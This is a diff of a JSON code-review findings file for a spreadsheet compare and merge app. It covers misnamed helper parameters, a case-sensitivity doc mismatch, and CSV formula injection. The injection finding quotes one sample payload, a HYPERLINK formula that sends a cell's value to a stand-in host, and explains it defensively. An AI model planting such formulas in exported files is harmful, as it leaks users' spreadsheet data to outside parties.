@@ -1,33 +1,42 @@
 {
-  "attestation_id": "sha256:0200e84f5fb2b51734d6abe7eafd56f2d78d3fe3d8e0d6f1fb1078199f1ee1ce",
+  "attestation_id": "sha256:537e1795fd8d43fc7e5ea705243432083887b5dc707e457b932189dbf56842f0",
   "available": true,
   "by_severity": {
     "critical": 0,
     "high": 0,
     "info": 0,
-    "low": 2,
+    "low": 3,
     "medium": 0
   },
   "findings": [
     {
-      "category": "accessibility",
-      "detail": "The new `disabled={… || mappedCount === 0 …}` guard is the right fix for the silent 'perfect match' bug, but the only explanation is `title={mappedCount === 0 ? 'Map at least one column to compare' : undefined}`. A disabled `<button>` is removed from the tab order and does not fire hover in several browsers, so a keyboard or screen-reader user sees a greyed-out control with no reason given — the `addLog` warning at the top of `handleCompare` is now unreachable, because the click can never land. Raise this to medium if the compare screen is ever the only path to the feature for an assistive-tech user; today the mapping UI directly above gives some context.",
-      "file": "components/CompareTool.tsx",
-      "line": 356,
+      "category": "code-smell",
+      "detail": "`keyOf()` correctly switches the per-file state maps from file name to a WeakMap-assigned id (`file-1`, `file-2`, …), which is the fix for two uploads called `export.xlsx` collapsing into one. But the four helpers that consume those keys kept their old parameter names: `removeFile(name: string)` (:109), `moveCol(fileName: string, …)` (:123), `updateCol(fileName: string, …)` (:135) and `getProcessedDataForFile(fileName: string)` (:143). The names now actively lie about what they accept, and `f.name` is still in scope at every call site (:180, :199, :284, :362). A future caller who writes `getProcessedDataForFile(f.name)` gets `allFiles.find(f => keyOf(f) === 'export.xlsx')` → `undefined` → an early `return []`, which surfaces as an empty merged sheet with no error and no log line — the same silent-wrong-output class this PR exists to close. The handbook's stringly-typed smell applies: the key is a distinct concept with a lookalike string type.",
+      "file": "components/MergeTool.tsx",
+      "line": 143,
       "severity": "low",
       "suggested_fix": null,
-      "summary": "Disabled Run button explains itself only via `title`"
+      "summary": "Merge helpers still named `name`/`fileName` but now take an opaque file id"
     },
     {
-      "category": "typescript",
-      "detail": "`openWith(app: any, page: Page, …)` introduces an unjustified `any` in a file the PR adds. The concrete type is already exported from the module this spec imports from — `e2e/fixtures.ts:7` re-exports `AppShell`, and `Fixtures['app']` is declared as `AppShell` at `e2e/fixtures.ts:65`. Two sibling specs (`exporter-date-format.spec.ts:49`, `files-validation.spec.ts:46`) already use the typed form, so this is drift rather than a missing type. Concretely: a rename or signature change to `AppShell.openTool`/`goto` will not fail type-check in this spec, and the failure will surface only as a runtime Playwright error.",
-      "file": "e2e/reference-fixes.spec.ts",
-      "line": 24,
+      "category": "security",
+      "detail": "`toCsv` wraps every cell in quotes and doubles embedded quotes, which fixes the `#`-truncation bug it was written for. It does not stop CSV formula injection: Excel strips the surrounding quotes on import and still evaluates a field whose first character is `=`, `+`, `@`, TAB or CR, so a source spreadsheet cell containing `=HYPERLINK(\"http://x/\"&A1,\"click\")` is re-armed as a live formula in `Comparison_*.csv`. This is NOT a regression — the inline builder this replaced produced the same bytes — and the data is the user's own upload opened by the same user, which is why it is low rather than medium. What would raise it: Compare growing a path where the exported CSV is shared with, or generated from data supplied by, someone other than the person who opens it. Note the XLSX path is already safe — SheetJS writes these as `t:'s'` text cells, and `aiInsightsRows` (model output) only ever reaches that path, so handbook rule 5 is not violated here.",
+      "file": "utils/compareUtils.ts",
+      "line": 225,
       "severity": "low",
       "suggested_fix": null,
-      "summary": "New helper annotates the `app` fixture as bare `any`"
+      "summary": "`toCsv` quotes cells but does not neutralise leading `=` / `+` / `@`"
+    },
+    {
+      "category": "technical-debt",
+      "detail": "`utils/identifiers.ts:28-33` documents D7 as 'Deliberately NOT changed … **case** — identifiers are compared as exact text', and that is how Files Validation uses it. Both call sites added by this PR wrap it the other way: `compareKey` here is `identifierKey(v).toLowerCase()` (:69) and `utils/dedupe.ts:36` does `identifierKey(row[c]).toLowerCase()`. That is the right call for these two tools — it preserves their pre-existing behaviour, the inline comments say so, and `tests/unit/dedupe.test.ts` pins it ('is case-insensitive and trims, as before') — but it means `SKU-A` and `sku-a` are now one identifier in Compare and Deduplicate and two in Files Validation, while the shared helper's docblock asserts only the latter. Someone reading `identifiers.ts` to answer 'does this app treat SKUs case-sensitively?' gets the wrong answer for two of the three tools. Cheap to fix now, expensive once the next tool picks a third policy by copying whichever call site it found first.",
+      "file": "utils/compareUtils.ts",
+      "line": 69,
+      "severity": "low",
+      "suggested_fix": null,
+      "summary": "`identifierKey` doc states case is significant; both new callers lower-case it"
     }
   ],
   "schema": "apexyard.evidence.findings/1",
-  "total": 2
+  "total": 3
 }
